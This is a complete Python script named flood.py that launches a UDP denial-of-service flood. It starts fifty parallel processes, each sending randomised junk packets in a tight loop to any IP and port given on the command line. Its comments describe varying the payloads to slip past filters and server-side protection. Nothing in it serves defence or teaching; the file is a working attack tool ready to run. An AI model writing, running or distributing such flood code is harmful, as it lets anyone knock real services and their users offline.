import socket
import multiprocessing
import time
import sys
import random
import os

def flood(target, port, duration):
    # Prepare multiple packets of different sizes to bypass simple filters
    payloads = [random._urandom(size) for size in range(512, 1024, 64)]
    end_time = time.time() + duration
    
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Most efficient way to send in Python: pre-bind or use zero-copy if possible
    # We use a tight loop with a local reference for speed
    sendto = client.sendto
    
    while time.time() < end_time:
        # Send 200 packets per timing check to maximize throughput
        for _ in range(200):
            try:
                # Randomize payload to confuse server-side protection
                sendto(random.choice(payloads), (target, port))
            except:
                pass
    client.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 flood.py <target> <port> <time> <threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration_secs = int(sys.argv[3])
    # 50 processes is very aggressive for a standard VPS/Codespace
    num_processes = 50 

    print(f"🚀 EXTREME POWER Mode: Starting 50 parallel flood processes on {target_ip}:{target_port}...")
    
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=flood, args=(target_ip, target_port, duration_secs))
        p.start()
        processes.append(p)

    # Wait for all processes to complete
    for p in processes:
        p.join()
        
    print("✅ Extreme Flood Finished.")
